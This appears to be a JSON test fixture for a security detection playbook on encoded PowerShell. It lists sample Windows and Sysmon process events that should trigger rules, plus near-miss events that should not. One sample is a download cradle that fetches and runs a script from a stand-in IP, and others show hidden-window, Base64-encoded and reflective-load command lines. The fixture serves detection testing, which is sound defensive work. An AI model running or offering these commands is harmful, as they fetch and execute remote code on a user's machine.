{
 "playbook": "signal_encoded_powershell",
 "fires": [
  {
   "rule": "Base64 Encoded Command",
   "events": [
    {
     "fields": {
      "windows.event_id": 4688,
      "windows.channel": "Security",
      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
      "SubjectUserName": "alice"
     }
    }
   ]
  },
  {
   "rule": "Download Cradle Pattern",
   "events": [
    {
     "fields": {
      "windows.event_id": 1,
      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')\"",
      "User": "CORP\\alice"
     }
    }
   ]
  },
  {
   "rule": "Hidden Window With Encoded Command",
   "events": [
    {
     "fields": {
      "windows.event_id": 4688,
      "windows.channel": "Security",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "CommandLine": "cmd /c powershell -nop -w hidden -enc SQBFAFgA",
      "SubjectUserName": "alice"
     }
    }
   ]
  },
  {
   "rule": "Reflection Assembly Load",
   "events": [
    {
     "fields": {
      "windows.event_id": 4688,
      "windows.channel": "Security",
      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell -c [System.Reflection.Assembly]::Load([Convert]::FromBase64String($b))",
      "SubjectUserName": "alice"
     }
    }
   ]
  }
 ],
 "near_miss": [
  {
   "name": "plain script run",
   "events": [
    {
     "fields": {
      "windows.event_id": 4688,
      "windows.channel": "Security",
      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -File C:\\scripts\\inventory.ps1",
      "SubjectUserName": "alice"
     }
    }
   ]
  },
  {
   "name": "short -e argument",
   "events": [
    {
     "fields": {
      "windows.event_id": 4688,
      "windows.channel": "Security",
      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell -e abc",
      "SubjectUserName": "alice"
     }
    }
   ]
  },
  {
   "name": "hidden window without an encoded payload",
   "events": [
    {
     "fields": {
      "windows.event_id": 4688,
      "windows.channel": "Security",
      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell -nop -w hidden -File C:\\scripts\\tray.ps1",
      "SubjectUserName": "alice"
     }
    }
   ]
  }
 ]
}
